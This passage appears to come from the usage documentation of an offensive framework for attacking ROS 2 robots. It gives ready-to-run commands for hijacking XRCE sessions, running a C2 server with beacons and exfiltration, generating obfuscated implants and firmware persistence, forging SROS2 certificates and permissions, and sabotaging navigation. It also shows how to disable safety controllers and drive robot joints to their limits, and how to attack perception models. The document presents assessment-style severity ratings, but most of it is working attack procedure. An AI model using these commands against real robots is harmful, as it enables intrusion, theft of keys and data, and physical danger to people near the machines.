python3 ros2reaper.py microros-agent --target 10.0.0.5 --agent-port 7400 --skip-auth
```

---

### `xrce-traffic` — XRCE Traffic Analysis & Behavioral Profiling

Captures live XRCE traffic and builds a behavioral baseline: packet size distributions, inter-packet timing, heartbeat intervals, QoS patterns, and per-session/stream statistics. Used to time and size subsequent injections to blend with normal traffic.

```bash
# 30-second capture baseline
python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --duration 30 --skip-auth

# Longer capture with JSON + PCAP export
python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --agent-port 8888 \
    --duration 60 -o baseline.json --pcap capture.pcap --skip-auth -v
```

---

### `xrce-hijack` — XRCE Client Hijacking & Command Injection

Creates a spoofed XRCE client session against a discovered Agent and injects malicious DDS messages. Supports Twist (velocity), PoseStamped (navigation goal), and raw CDR payload injection.

| Mode | Description |
|------|-------------|
| `twist` | Inject `geometry_msgs/Twist` — robot velocity control |
| `nav` | Inject `geometry_msgs/PoseStamped` — navigation goal |
| `raw` | Inject arbitrary CDR-encoded payload from hex or file |

```bash
# Inject cmd_vel spin (default topic /cmd_vel)
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack twist \
    --lx 0.5 --az 1.0 --count 20 --interval 0.1 --skip-auth

# Navigate robot to coordinates
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack nav \
    --topic /move_base_simple/goal --x 15.0 --y 8.0 --skip-auth

# Raw payload injection (custom CDR message)
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack raw \
    --topic /cmd_vel --payload-hex 0000803f000000000000000000000000000000000000803f \
    --count 5 --skip-auth

# Use specific session ID and custom port
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --agent-port 7400 \
    --xrce-session 0x81 --xrce-attack twist --lx 2.0 --skip-auth
```

---

### Phase 4 Attack Workflow

Full post-exploitation flow following a successful Phase 2 compromise:

```bash
# 1. Start C2 server on operator machine
python3 ros2reaper.py c2-server --domain-id 0 --c2-key opskey -o session_log.json --skip-auth

# 2. Deploy beacon on compromised ROS 2 host (runs on the target)
python3 ros2reaper.py c2-beacon --target <operator_ip> --c2-key opskey --c2-interval 15 --skip-auth

# 3. In the c2-server shell:
#    sessions                         ← see the new session appear
#    use <session_id>
#    task sysinfo                     ← fingerprint the host
#    task ros_enum                    ← map the ROS graph
#    task shell ros2 topic list       ← arbitrary command execution
#    task topic_read /cmd_vel         ← intercept velocity commands

# 4. Exfiltrate from the compromised host
python3 ros2reaper.py c2-exfil --target <operator_ip> --c2-key opskey --exfil-mode params --skip-auth

# 5. Receive on operator side
python3 ros2reaper.py c2-recv --c2-session <session_id> --c2-key opskey -o ros_params.txt --skip-auth

---

### `uros-implant` — micro-ROS C2 Implant Generation

Generates complete micro-ROS C2 implant source code from templates. The implant beacons periodically to a C2 callback topic and accepts tasking commands over DDS. Supports three target platforms.

| Platform | Output | Use case |
|----------|--------|----------|
| `cpp` | `.cpp` (ROS 2 node) | Full ROS 2 host or cross-compiled MCU |
| `arduino` | `.ino` (Arduino sketch) | Arduino-compatible boards with Ethernet/WiFi |
| `python` | `.py` (rclpy node) | Rapid prototyping / testing |

```bash
# Generate Python implant (lab testing)
python3 ros2reaper.py uros-implant --platform python --skip-auth

# Generate Arduino implant with custom beacon interval
python3 ros2reaper.py uros-implant --platform arduino \
    --implant-id sensor_node_01 --beacon-interval 3000 --skip-auth

# Generate C++ implant with obfuscation + manifest
python3 ros2reaper.py uros-implant --platform cpp --obfuscate --add-decoy \
    --beacon-interval 10000 --manifest implants.json --skip-auth
```

---

### `uros-persist` — Firmware-Level Persistence

Establishes persistent implant presence at the firmware level. Generates patched firmware images, bootloader hooks, partition table modifications, or OTA hijack configurations.

| Method | Survives | Notes |
|--------|----------|-------|
| `library_patch` | App reinstalls | Injects beacon into micro-ROS client library |
| `bootloader` | OS wipe | Hooks bootloader to run implant before firmware |
| `firmware_inject` | Normal updates | Appends implant to firmware image |
| `partition` | Factory reset | Creates hidden partition in ESP32 partition table |
| `ota_hijack` | Updates (MITM) | Generates config for serving malicious OTA firmware |

```bash
# Library patch (micro-ROS .elf firmware)
python3 ros2reaper.py uros-persist --persist-method library_patch \
    --target firmware.elf --implant-id sensor_01 \
    --implant-hex deadbeef... --skip-auth -o persist.json

# ESP32 partition hijack
python3 ros2reaper.py uros-persist --persist-method partition \
    --target partitions.csv --implant-id sensor_01 \
    --implant-file implant.bin --partition-name implant_hidden --skip-auth

# OTA hijack config generation
python3 ros2reaper.py uros-persist --persist-method ota_hijack \
    --implant-id sensor_01 --ota-server ota.target.local --skip-auth

# Bootloader hook with specific hook address
python3 ros2reaper.py uros-persist --persist-method bootloader \
    --target bootloader.elf --implant-id sensor_01 \
    --implant-file implant.bin --hook-address 0x08000100 --skip-auth
```

---

### `uros-c2` — Phase 5A C2 Dispatcher

Interactive operator console that routes commands to deployed micro-ROS implants (via DDS topics) or live XRCE Agents (via Module 3 hijacking). Tracks the implant registry, manages task queues, and aggregates telemetry.

```bash
# Start interactive dispatcher
python3 ros2reaper.py uros-c2 --skip-auth

# With C2 callback and logging
python3 ros2reaper.py uros-c2 --target 10.0.0.1 --dispatcher-port 9999 \
    --beacon-timeout 120 --log-file dispatcher.log --skip-auth

# Batch mode — run commands from file
python3 ros2reaper.py uros-c2 --batch-file tasks.txt \
    --export-session session.json --skip-auth
```

**Dispatcher commands (interactive console):**

```
[dispatcher]> action uros_abc123 inject_twist lx=2.0 az=1.0
[dispatcher]> action uros_abc123 inject_nav x=10.0 y=5.0
[dispatcher]> action 10.0.0.5 inject_twist lx=5.0 port=8888
[dispatcher]> status implants
[dispatcher]> status implants uros_abc123
[dispatcher]> status tasks
[dispatcher]> help
```

---

### Phase 5A Pipeline

Full micro-ROS assessment and exploitation workflow:

```bash
# 1. Discover XRCE Agents on the subnet
python3 ros2reaper.py microros-agent --network 10.0.0.0/24 \
    --xrce-enumerate -o agents.json --skip-auth

# 2. Build behavioral baseline (30s passive capture)
python3 ros2reaper.py xrce-traffic --target 10.0.0.5 \
    --duration 30 -o baseline.json --pcap xrce.pcap --skip-auth

# 3. Hijack session and inject velocity command
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 \
    --xrce-attack twist --lx 1.5 --az 0.5 --count 10 --skip-auth

# 4. Generate persistent implant
python3 ros2reaper.py uros-implant --platform python \
    --implant-id lab_node_01 --beacon-interval 5000 --skip-auth

# 5. Start C2 dispatcher and receive implant beacons
python3 ros2reaper.py uros-c2 --log-file lab_session.log --skip-auth
```

---

## Phase 5B — SROS2/DDS-Security Subversion

> No ROS installation required. All Phase 5B modules operate at the raw socket level. The `sros2-policy --forge` command requires `openssl` in `PATH` for signing. Certificate parsing uses pure Python (no `cryptography` dependency).

Phase 5B targets the **DDS-Security (SROS2) authentication and access control layer** — the primary defense mechanism for secured ROS 2 deployments. It intercepts security handshakes, extracts X.509 certificates, subverts governance/permissions policies, and uses harvested material to infiltrate secured domains.

**Phase 5B options:**

| Flag | Description |
|------|-------------|
| `--from-intercept` | `sros2-harvest`: parse identity tokens from `sros2-intercept` JSON output |
| `--keystore-path` | `sros2-harvest`: explicit SROS2 keystore root path |
| `--governance` | `sros2-policy`: path to `governance.xml` or `governance.p7s` |
| `--permissions` | `sros2-policy`: path to `permissions.xml` or `permissions.p7s` |
| `--ca-cert` | `sros2-policy`: CA certificate PEM for forgery signing |
| `--ca-key` | `sros2-policy`: CA private key PEM for forgery signing |
| `--forge-policy` | `sros2-policy`: generate forged governance + permissions documents |
| `--forged-output` | `sros2-policy`: save forged `permissions.xml` to file |
| `--subject-name` | Subject DN for forged certificate |
| `--cert-file` | `sros2-infiltrate`: node certificate PEM (impersonate mode) |
| `--permissions-file` | `sros2-infiltrate`: signed `permissions.p7s` (impersonate mode) |
| `--infiltrate-mode` | `sros2-infiltrate`: `downgrade`, `eavesdrop`, or `impersonate` |
| `--spoof-node-name` | `sros2-infiltrate`: spoofed DDS participant name |
| `--interface` | `sros2-intercept`: network interface IP for multicast binding |

---

### `sros2-intercept` — DDS-Security Handshake Interception

Passively captures RTPS SPDP traffic containing DDS-Security identity tokens, permissions tokens, and security attribute bitmasks. Maps the domain's authentication strategy (ENFORCE vs. PERMISSIVE) and identifies SIGN-only nodes whose topic data is readable in plaintext.

Zero packets sent — full stealth mode.

```bash
# Listen on domain 0 for 60 seconds
python3 ros2reaper.py sros2-intercept --domain-id 0 --duration 60 --skip-auth

# Target specific host
python3 ros2reaper.py sros2-intercept --target 192.168.1.100 --duration 30 -o tokens.json --skip-auth
```

Output includes:
- Per-participant security posture (identity token class_id, RTPS/submsg/payload protection modes)
- Downgrade candidates (no RTPS protection → Phase 2 injectable)
- SIGN-only participants (payload visible in plaintext)
- Domain authentication strategy (ENFORCE / PERMISSIVE)
- Token binary properties (certificate property names for downstream harvesting)

---

### `sros2-harvest` — X.509 Certificate & Key Material Extraction

Extracts and analyzes X.509 certificates from two sources:
1. **Network tokens** — identity tokens captured by `sros2-intercept` (Module 1)
2. **Filesystem keystores** — SROS2 keystore trees (created by `ros2 security create_keystore`)

Scores certificate weaknesses with CVSS ratings and identifies rogue CA and node impersonation opportunities.

```bash
# Scan filesystem for SROS2 keystores
python3 ros2reaper.py sros2-harvest --skip-auth

# Explicit keystore path
python3 ros2reaper.py sros2-harvest --keystore-path /opt/ros/keystore -o harvest.json --skip-auth

# Parse tokens from intercept output (Module 1)
python3 ros2reaper.py sros2-harvest --from-intercept tokens.json --skip-auth
```

Weakness scoring:

| Finding | Severity | CVSS | Attack Scenario |
|---------|----------|------|-----------------|
| CA private key accessible | CRITICAL | 10.0 | Sign forged node certs → impersonate ANY node |
| Node private key accessible | CRITICAL | 9.8 | Direct node identity impersonation |
| Expired certificate | HIGH | 7.5 | Accepted by lenient agents with clock drift |
| Self-signed CA | HIGH | 7.0 | Forge matching-DN CA → bypass chain validation |
| RSA < 2048 bits | HIGH | 7.0 | Offline key factoring |
| SHA-1 signature | MEDIUM | 6.5 | Certificate collision (SHAttered) |

---

### `sros2-policy` — Governance/Permissions Policy Analysis & Forgery

Parses SROS2 `governance.xml` and `permissions.xml` (including S/MIME-wrapped `.p7s` files) for security misconfigurations. Optionally generates forged policy documents and signs them with an extracted CA key.

```bash
# Analyze governance + permissions
python3 ros2reaper.py sros2-policy \
  --governance /opt/ros/keystore/enclaves/robot1/governance.p7s \
  --permissions /opt/ros/keystore/enclaves/robot1/permissions.p7s \
  --skip-auth

# Generate forged unrestricted permissions (unsigned)
python3 ros2reaper.py sros2-policy \
  --permissions /opt/ros/keystore/enclaves/robot1/permissions.p7s \
  --forge-policy \
  --subject-name "CN=attacker,O=TargetOrg" \
  --forged-output forged_permissions.xml \
  --skip-auth

# Generate AND sign forged permissions with extracted CA key
python3 ros2reaper.py sros2-policy \
  --permissions /opt/ros/keystore/enclaves/robot1/permissions.p7s \
  --forge-policy \
  --ca-cert /opt/ros/keystore/public/ca.cert.pem \
  --ca-key /opt/ros/keystore/private/ca.key.pem \
  --subject-name "CN=attacker,O=TargetOrg" \
  -o policy_analysis.json \
  --skip-auth
```

Key findings detected:

| Check | Severity | Description |
|-------|----------|-------------|
| `GOV-001` | CRITICAL | `allow_unauthenticated_participants=true` (PERMISSIVE mode) |
| `GOV-002` | HIGH | `enable_join_access_control=false` (any cert joins) |
| `GOV-003` | HIGH | `rtps_protection_kind=SIGN` (plaintext payload) |
| `GOV-005a` | CRITICAL | `enable_write_access_control=false` on topic |
| `PERM-001` | CRITICAL | Wildcard `subject_name=*` in grant |
| `PERM-002` | HIGH | `default=ALLOW` (implicit topic access) |
| `PERM-003a` | HIGH | Wildcard publish topic `*` |

---

### `sros2-infiltrate` — Secured Domain Entry

Active exploitation module. Joins a secured DDS domain using material gathered by the previous modules.

**Three modes:**

| Mode | Prerequisite | Description |
|------|--------------|-------------|
| `downgrade` | `GOV-001` (PERMISSIVE) | Announce unsecured SPDP participant — domain accepts without auth |
| `eavesdrop` | `GOV-003` (SIGN-only) | Passive capture + CDR decode of plaintext topic payloads |
| `impersonate` | `cert.pem` + `key.pem` | Announce with harvested identity token — join as existing node |

```bash
# Downgrade attack — join PERMISSIVE domain without credentials
python3 ros2reaper.py sros2-infiltrate \
  --infiltrate-mode downgrade \
  --target 192.168.1.100 \
  --domain-id 0 \
  --duration 30 \
  --spoof-node-name robot_controller \
  --skip-auth

# Eavesdrop on SIGN-only domain (no encryption, payloads readable)
python3 ros2reaper.py sros2-infiltrate \
  --infiltrate-mode eavesdrop \
  --domain-id 0 \
  --duration 60 \
  -o eavesdrop.json \
  --skip-auth

# Impersonate node using harvested certificates
python3 ros2reaper.py sros2-infiltrate \
  --infiltrate-mode impersonate \
  --target 192.168.1.100 \
  --cert-file /opt/ros/keystore/enclaves/robot1/cert.pem \
  --permissions-file forged_permissions.p7s \
  --subject-name "CN=robot1,O=RobotCorp" \
  --domain-id 0 \
  --skip-auth
```

---

### Phase 5B Pipeline

Full SROS2 subversion workflow:

```bash
# 1. Intercept DDS-Security traffic — identify domain posture and capture tokens
python3 ros2reaper.py sros2-intercept --domain-id 0 --duration 60 -o tokens.json --skip-auth

# 2. Harvest certificates — extract from keystore or network tokens
python3 ros2reaper.py sros2-harvest --from-intercept tokens.json -o harvest.json --skip-auth
# OR (if shell access from Phase 5A implant)
python3 ros2reaper.py sros2-harvest --keystore-path /opt/ros/keystore -o harvest.json --skip-auth

# 3. Analyze policies and forge if CA key available
python3 ros2reaper.py sros2-policy \
  --governance /opt/ros/keystore/enclaves/robot1/governance.p7s \
  --permissions /opt/ros/keystore/enclaves/robot1/permissions.p7s \
  --forge-policy \
  --ca-cert /opt/ros/keystore/public/ca.cert.pem \
  --ca-key /opt/ros/keystore/private/ca.key.pem \
  --subject-name "CN=attacker_node,O=TargetOrg" \
  -o policy.json --skip-auth

# 4. Infiltrate secured domain
python3 ros2reaper.py sros2-infiltrate \
  --infiltrate-mode impersonate \
  --target 192.168.1.100 \
  --cert-file /opt/ros/keystore/enclaves/robot1/cert.pem \
  --permissions-file forged_permissions.p7s \
  --skip-auth

# 5. Now in domain — run Phase 2 injection as "secured" node
python3 ros2reaper.py inject --namespace /robot1 --preset spin --domain-id 0 --skip-auth
```

---

## Phase 5C — Nav2 + ros2_control / Hardware Interface Layer

> Full attack capability requires `rclpy` and the target ROS 2 distribution. Enumeration, BT XML generation, and raw RTPS injection work without ROS 2 installed.

Phase 5C targets the **navigation and hardware control plane** of a ROS 2 robot — the layer above raw topics (Phase 2) that governs *how* the robot makes decisions and *how* those decisions reach the physical actuators.

**Architecture targeted:**

```
NavigateToPose goal
   └─► bt_navigator (BT executor) ──► ComputePathToPose ──► planner_server
                │                 └─► FollowPath ──► controller_server
                │                 └─► Recovery (Spin / BackUp / Wait)
                └─ lifecycle state machine (configure / activate / deactivate)

controller_server ──► ros2_control controller_manager
                            └─► hardware_interface plugin ──► actuator drivers
```

**Phase 5C CLI options:**

| Option | Default | Description |
|--------|---------|-------------|
| `--nav2-mode` | `enumerate` | nav2-lifecycle mode: enumerate, deactivate, shutdown, cascade, param_poison |
| `--nav2-nodes` | all critical | Specific lifecycle node names to target |
| `--costmap-mode` | `enumerate` | nav2-costmap mode: map_clear, map_block, fake_scan, inflate_zero, svc_clear, … |
| `--map-width` | `100` | Injected occupancy grid width (cells) |
| `--map-height` | `100` | Injected occupancy grid height (cells) |
| `--map-resolution` | `0.05` | Injected map resolution (m/cell) |
| `--wall-angle` | `0.0` | Fake scan wall bearing in radians |
| `--wall-distance` | `1.5` | Fake scan wall distance in metres |
| `--inflation-radius` | `0.0` | Inflation radius for inflate_zero attack |
| `--bt-mode` | `enumerate` | nav2-bt mode: cancel, redirect, recovery_loop, param_hijack, generate_bt |
| `--redirect-x/y/yaw` | 0.0 | nav2-bt redirect: attacker-chosen goal coordinates |
| `--recovery-mode` | `spin` | nav2-bt recovery: spin, backup, wait |
| `--recovery-cycles` | `5` | nav2-bt recovery_loop: number of cycles |
| `--bt-xml-path` | `/tmp/malicious_bt.xml` | nav2-bt param_hijack: path to deploy malicious BT XML |
| `--bt-template` | `spin_only` | BT template: no_recovery, infinite_retry, spin_only, clear_and_navigate, goal_checker_bypass |
| `--bt-output` | — | nav2-bt generate_bt: save BT XML to file |
| `--ctrl-mode` | `enumerate` | ros2ctrl-exploit mode: traj_inject, switch_ctrl, limit_bypass, ctrl_crash, hw_disable |
| `--controller-name` | `joint_trajectory_controller` | Controller to target |
| `--joint-names` | UR5 defaults | Joint names list |
| `--joint-positions` | π for all | Target positions in radians |
| `--stop-controllers` | safety controllers | Controllers to stop (switch_ctrl) |
| `--start-controllers` | — | Controllers to start (switch_ctrl) |
| `--hw-name` | — | Hardware component name (hw_disable) |
| `--traj-duration` | `2.0` | Trajectory execution duration in seconds |

---

### `nav2-lifecycle` — Nav2 Lifecycle State Machine Attack

Nav2 nodes implement the ROS 2 managed node lifecycle (`unconfigured → inactive → active`). Forcing a node out of the `active` state stops navigation without crashing the OS process — no obvious crash log, and operators see only "lifecycle transition failed."

| Mode | Effect | CVSS |
|------|--------|------|
| `enumerate` | List all Nav2 lifecycle nodes and current states | — |
| `deactivate` | Call `change_state(DEACTIVATE)` on all critical Nav2 nodes | 8.6 HIGH |
| `shutdown` | Call `change_state(SHUTDOWN)` — node must restart to recover | 9.1 CRITICAL |
| `cascade` | Deactivate in dependency order (bt_navigator → planner → controller) | 9.1 CRITICAL |
| `param_poison` | Set destabilizing parameters before next lifecycle transition | 9.8 CRITICAL |

**Param poison payloads:**
- `bt_navigator` → `bt_xml_filename` set to nonexistent path (configure fails)
- `planner_server` → `expected_planner_frequency: 0.0` (divide by zero)
- `controller_server` → `controller_frequency: 0.0` (divide by zero)
- `amcl` → `min_particles > max_particles` (assertion fail)

```bash
# Enumerate Nav2 node states
python3 ros2reaper.py nav2-lifecycle --nav2-mode enumerate --skip-auth

# Stop all navigation (service still running, but inactive)
python3 ros2reaper.py nav2-lifecycle --nav2-mode deactivate --skip-auth

# Escalate: shutdown forces a restart to recover
python3 ros2reaper.py nav2-lifecycle --nav2-mode shutdown --skip-auth

# Poison parameters so next nav2 launch fails
python3 ros2reaper.py nav2-lifecycle --nav2-mode param_poison --skip-auth
```

---

### `nav2-costmap` — Costmap & Sensor Data Poisoning

Nav2 uses two costmaps (global + local) built from sensor streams. By injecting fake `/map`, `/scan`, or `/pointcloud` data, or calling the costmap clearing services directly, an attacker removes obstacles from the robot's world model.

| Mode | Topic/Service | Effect | CVSS |
|------|--------------|--------|------|
| `map_clear` | `/map` | All cells = 0 (robot plans through real walls) | 9.8 CRITICAL |
| `map_block` | `/map` | All cells = 100 (navigation DoS) | 8.6 HIGH |
| `map_maze` | `/map` | Attacker-controlled maze with deliberate corridors | 8.6 HIGH |
| `map_partial` | `/map` | Clear circular region in otherwise intact map | 7.5 HIGH |
| `svc_clear` | `/clear_entirely_*` | Call costmap clear services directly | 8.6 HIGH |
| `fake_scan` | `/scan` | Inject phantom wall at specified bearing/distance | 8.6 HIGH |
| `fake_cloud` | `/pointcloud` | Inject 3D obstacle cluster | 7.5 HIGH |
| `inflate_zero` | param | Set `inflation_radius=0.0` (no robot clearance margin) | 7.5 HIGH |
| `voxel_clear` | `/clear_voxel_layer` | Clear 3D obstacle voxel layer | 7.5 HIGH |

```bash
# Clear all obstacles — robot plans through walls (CRITICAL)
python3 ros2reaper.py nav2-costmap --costmap-mode map_clear --skip-auth

# Inject phantom wall 0.5m in front of robot
python3 ros2reaper.py nav2-costmap --costmap-mode fake_scan \
  --wall-angle 0.0 --wall-distance 0.5 --skip-auth

# Remove inflation radius — robot ignores proximity to walls
python3 ros2reaper.py nav2-costmap --costmap-mode inflate_zero --skip-auth

# Clear via service (no rclpy raw socket alternative)
python3 ros2reaper.py nav2-costmap --costmap-mode svc_clear --skip-auth
```

---

### `nav2-bt` — Behavior Tree Hijacking

The Nav2 behavior tree executor (`bt_navigator`) loads a BT XML file and runs it in a 10ms loop. This module targets the BT execution layer — cancelling in-flight goals, redirecting navigation targets, forcing recovery behaviors, and replacing the BT XML itself.

| Mode | Effect | CVSS |
|------|--------|------|
| `enumerate` | Read `bt_xml_filename`, `bt_loop_duration`, active goals | — |
| `cancel` | Cancel ALL active navigation goals immediately | 8.6 HIGH |
| `redirect` | Monitor goals, cancel + re-issue to attacker coordinates | 9.8 CRITICAL |
| `recovery_loop` | Force repeated Spin/BackUp/Wait recovery cycles | 7.5 HIGH |
| `param_hijack` | Write malicious BT XML path to `bt_xml_filename` parameter | 9.8 CRITICAL |
| `generate_bt` | Generate malicious BT XML (no ROS 2 required) | — |

**BT templates for `--bt-template`:**

| Template | Effect |
|----------|--------|
| `spin_only` | Replace navigation BT with continuous full-rotation |
| `no_recovery` | Remove all recovery behaviors (crash → stop forever) |
| `infinite_retry` | 999,999 retry loop → stuck navigation state |
| `clear_and_navigate` | Clear all obstacles before each navigation step |
| `goal_checker_bypass` | Remove goal-reached tolerance (never stops) |

```bash
# Cancel any in-progress navigation mission
python3 ros2reaper.py nav2-bt --bt-mode cancel --skip-auth

# Redirect all goals to coordinate (50, 50) for 60 seconds
python3 ros2reaper.py nav2-bt --bt-mode redirect \
  --redirect-x 50.0 --redirect-y 50.0 --duration 60 --skip-auth

# Force 10 spin cycles (recovery loop abuse)
python3 ros2reaper.py nav2-bt --bt-mode recovery_loop \
  --recovery-mode spin --recovery-cycles 10 --skip-auth

# Generate malicious BT XML and deploy it
python3 ros2reaper.py nav2-bt --bt-mode param_hijack \
  --bt-template spin_only --bt-xml-path /tmp/evil.xml --skip-auth

# Generate only (no ROS 2 needed)
python3 ros2reaper.py nav2-bt --bt-mode generate_bt \
  --bt-template infinite_retry --bt-output ./bt_infinite.xml --skip-auth
```

---

### `ros2ctrl-exploit` — ros2_control Hardware Interface Exploitation

`controller_manager` is the bridge between the Nav2 motion planners and the physical actuators. Compromising it means direct physical effect: joints driven beyond limits, controllers killed, or hardware interface disconnected from software.

| Mode | Effect | CVSS |
|------|--------|------|
| `enumerate` | List controllers, states, and hardware interfaces | — |
| `traj_inject` | FollowJointTrajectory: drive joints to limit positions | 9.8 CRITICAL |
| `switch_ctrl` | Stop safety controllers (FORCE_STOP), start attacker controllers | 9.1 CRITICAL |
| `limit_bypass` | Override position/velocity/effort limits via SetParameters | 9.1 CRITICAL |
| `ctrl_crash` | Send NaN/Inf/mismatched trajectory → controller fault state | 8.6 HIGH |
| `hw_disable` | set_hardware_component_state → INACTIVE (severs actuator feedback) | 9.1 CRITICAL |

```bash
# Enumerate controllers and hardware interfaces
python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode enumerate --skip-auth

# Drive all joints to their maximum positions (UR5 defaults)
python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode traj_inject \
  --controller-name joint_trajectory_controller \
  --traj-duration 2.0 --skip-auth

# Stop safety controller (robot becomes uncontrolled)
python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode switch_ctrl \
  --stop-controllers joint_trajectory_controller safety_pos_limit_controller \
  --skip-auth

# Expand joint limits to ±4π before trajectory injection
python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode limit_bypass \
  --controller-name joint_trajectory_controller --skip-auth

# Crash the controller with NaN trajectory
python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode ctrl_crash --skip-auth

# Disable hardware interface (severs all actuator feedback)
python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode hw_disable \
  --hw-name robot_arm --skip-auth
```

---

### Phase 5C Pipeline

```bash
# 1. Intercept SROS2 and bypass security (Phase 5B)
python3 ros2reaper.py sros2-infiltrate --infiltrate-mode downgrade \
  --target 192.168.1.100 --skip-auth

# 2. Deactivate Nav2 navigation stack
python3 ros2reaper.py nav2-lifecycle --nav2-mode cascade --skip-auth

# 3. Clear all costmap obstacles so robot drives blind
python3 ros2reaper.py nav2-costmap --costmap-mode map_clear --skip-auth

# 4. Cancel any recovery or re-navigation attempts
python3 ros2reaper.py nav2-bt --bt-mode cancel --skip-auth

# 5. Drive manipulator joints to hard stops
python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode traj_inject --skip-auth

# 6. Sever hardware interface to prevent recovery
python3 ros2reaper.py ros2ctrl-exploit --ctrl-mode hw_disable \
  --hw-name robot_arm --skip-auth
```

---

## Phase 6 — Edge AI / Perception Pipeline

> No special AI library required for enumeration, UAP generation, patch generation, or DDS injection. `numpy` enhances FGSM/PGD quality. `onnx` Python package enables full ONNX model backdoor injection. `Pillow` enables image I/O.

Phase 6 targets the AI/ML perception layer that robots use to interpret the physical world. Unlike Phases 1–5 which attack communication protocols and ROS services, Phase 6 attacks the **learned decision-making functions** — corrupting how the robot sees rather than how it talks.

**Threat model:**
```
Camera/LiDAR feed
  └─► AI inference node (YOLO / ResNet / PointPillars)
         │  served by Triton / TF Serving / ONNX Runtime
         └─► /detections  →  Nav2 costmap  →  robot motion
```

Compromising this pipeline means: the robot's avoidance behavior can be disabled, objects can be made invisible to the detector, or the robot can be tricked into believing a clear path exists where a wall stands.

**Phase 6 CLI options:**

| Option | Default | Description |
|--------|---------|-------------|
| `--ai-enum-mode` | `all` | Scope: all, triton, tf_serving, onnx_rt, mlflow, ros_svc, filesystem |
| `--ai-ports` | all known | Specific ports to probe for inference servers |
| `--ai-fs-paths` | system defaults | Filesystem paths to scan for model files |
| `--perturb-mode` | `uap` | fgsm, pgd, uap, patch, inject_topic, inject_triton |
| `--adv-epsilon` | `8.0` | Perturbation budget ε out of 255 (imperceptible ≤ 8) |
| `--adv-input` | — | Input image for FGSM/PGD |
| `--adv-output` | — | Output path for generated adversarial image |
| `--uap-pattern` | `checker` | UAP pattern: checker, frequency, gradient, random |
| `--patch-size-px` | `64` | Adversarial patch size in pixels |
| `--img-width/height` | `640×480` | Image dimensions for injection |
| `--ai-inject-count` | `30` | Number of adversarial frames to inject |
| `--pgd-steps` | `20` | PGD iterations |
| `--triton-model` | — | Model name for Triton queries |
| `--triton-port` | `8000` | Triton REST API port |
| `--extract-mode` | `fingerprint` | probe, fingerprint, timing, membership, reconstruct, full |
| `--ai-server-type` | `triton` | triton or tf_serving |
| `--ai-queries` | `50` | Number of queries for extraction |
| `--poison-mode` | `enumerate` | enumerate, triton_swap, onnx_patch, param_inject, generate_trigger |
| `--ai-model-path` | — | Path to ONNX model for onnx_patch |
| `--backdoor-path` | — | Output path for backdoored model |
| `--trigger-output` | — | Save backdoor trigger image to file |
| `--target-class` | `0` | Class index to activate on trigger detection |
| `--trigger-size` | `16` | Trigger patch size in pixels |

---

### `ai-enum` — AI/ML Inference Service Enumeration

Discovers all ML inference infrastructure associated with a ROS 2 robot: Triton Inference Server, TensorFlow Serving, MLflow model registries, ONNX Runtime servers, ROS 2 AI service topics, and model files on the filesystem.

| Finding | Severity | Attack Surface |
|---------|----------|----------------|
| Triton unauthenticated REST | CRITICAL 9.8 | Model swap, direct inference manipulation |
| TF Serving unauthenticated | HIGH 8.6 | Black-box extraction, DoS via query flood |
| Writable model files | CRITICAL 9.8 | Direct model replacement |
| PyTorch `.pt` files | HIGH 8.6 | Arbitrary code via malicious pickle deserialization |
| ROS 2 AI service topics | MEDIUM 6.5 | Goal/output manipulation via topic injection |

```bash
# Full AI infrastructure discovery
python3 ros2reaper.py ai-enum --target 192.168.1.100 --skip-auth

# Triton only
python3 ros2reaper.py ai-enum --target 192.168.1.100 --ai-enum-mode triton --skip-auth

# Filesystem model scan only (local)
python3 ros2reaper.py ai-enum --target localhost --ai-enum-mode filesystem --skip-auth
```

---

### `ai-perturb` — Adversarial Perturbation Generation & Injection

Generates adversarial examples using gradient-based methods (FGSM/PGD) or model-free structured patterns (UAP/patch), and injects them into the robot's camera data stream via raw RTPS or direct Triton queries.

| Mode | Requires | Effect |
|------|----------|--------|
| `uap` | None (pure Python) | Universal Adversarial Perturbation image (output file) |
| `patch` | None (pure Python) | Printable physical adversarial patch (PNG file) |
| `fgsm` | numpy | FGSM perturbation of input image |
| `pgd` | numpy | Stronger iterative PGD attack |
| `inject_topic` | socket | Publish adversarial frames to `/camera/image_raw` via raw RTPS |
| `inject_triton` | Triton access | PGD via Triton black-box + inject result |

```bash
# Generate UAP (no libraries needed)
python3 ros2reaper.py ai-perturb --perturb-mode uap \
  --uap-pattern checker --adv-output /tmp/uap.png --skip-auth

# Generate physical adversarial patch (print and stick on a surface)
python3 ros2reaper.py ai-perturb --perturb-mode patch \
  --patch-size-px 96 --adv-output /tmp/patch.png --skip-auth

# Inject 100 adversarial frames into /camera/image_raw (no ROS needed)
python3 ros2reaper.py ai-perturb --perturb-mode inject_topic \
  --target 192.168.1.100 --ai-inject-count 100 --uap-pattern checker --skip-auth

# FGSM on a specific input image
python3 ros2reaper.py ai-perturb --perturb-mode fgsm \
  --adv-input /tmp/frame.png --adv-output /tmp/adv_frame.png \
  --adv-epsilon 8.0 --skip-auth

# PGD attack via Triton (black-box gradient estimation)
python3 ros2reaper.py ai-perturb --perturb-mode pgd \
  --target 192.168.1.100 --triton-model yolov5 \
  --pgd-steps 40 --adv-epsilon 16.0 --skip-auth
```

---

### `ai-extract` — Black-Box Model Extraction

Extracts proprietary model information without accessing model weight files. Probes inference endpoints with structured inputs and analyzes outputs to reconstruct architecture, timing characteristics, and decision boundaries.

| Mode | Queries | Output |
|------|---------|--------|
| `fingerprint` | ~20 | Architecture guess, backend, latency profile, class count |
| `timing` | ~15 | Per-input-type latency profile, inference type classification |
| `membership` | ~5 | Signals indicating training data membership |
| `probe` | N | Raw (input, output) pair collection |
| `full` | ~40 | All of the above combined |

```bash
# Fingerprint all models on a Triton server
python3 ros2reaper.py ai-extract --target 192.168.1.100 \
  --extract-mode fingerprint --skip-auth

# Full extraction: fingerprint + timing + membership
